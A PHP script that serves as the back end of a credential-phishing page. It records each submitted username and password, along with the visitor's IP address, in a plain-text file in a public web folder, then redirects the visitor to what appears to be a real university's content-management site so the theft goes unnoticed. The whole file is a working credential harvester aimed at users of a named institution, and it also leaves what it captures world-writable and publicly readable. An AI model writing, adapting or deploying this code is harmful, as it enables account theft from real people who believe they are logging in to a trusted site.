<?php
// Get the POST data
$username = isset($_POST['username']) ? $_POST['username'] : 'no_username';
$password = isset($_POST['password']) ? $_POST['password'] : 'no_password';
$ip = $_SERVER['REMOTE_ADDR'];

// Format the data
$data = "IP: $ip - Username: $username - Password: $password\n";

// Write to a file in a web-accessible location
$dir = '/var/www/html/data';
if (!file_exists($dir)) {
    mkdir($dir, 0777, true);
}
file_put_contents($dir.'/captured.txt', $data, FILE_APPEND);

// Redirect to the real site
header('Location: https://cms.ucu.edu.ua');
exit;
?>